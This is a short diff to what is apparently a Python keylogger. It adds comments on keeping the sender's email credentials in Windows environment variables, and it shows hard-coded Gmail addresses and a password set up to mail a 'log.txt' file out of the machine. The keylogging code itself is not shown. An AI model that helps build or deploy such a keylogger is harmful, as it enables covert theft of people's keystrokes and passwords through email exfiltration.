@@ -11,6 +11,21 @@ from email import encoders
 # Global variables for easier testing
 filename = "log.txt"
 path = ""
+
+# FOR DEMONSTRATION PURPOSES ONLY
+# for actual use, please change the email and password and at least use
+# environment variables to get email and password.
+# on Windows:
+#   in cmd:
+#       SETX keylogger_email EMAIL
+#       SETX keylogger_pass PASSWORD
+#       restart system for changes to take place
+#
+#   in this script:
+#       import os
+#       fromaddr = os.getenv('keylogger_email')
+#       password = os.getenv('keylogger_pass')
+
 fromaddr = "somethingawesomekeylogger58@gmail.com"
 toaddr = "somethingawesomekeylogger58@gmail.com"
 password = "pythonkeylogger"
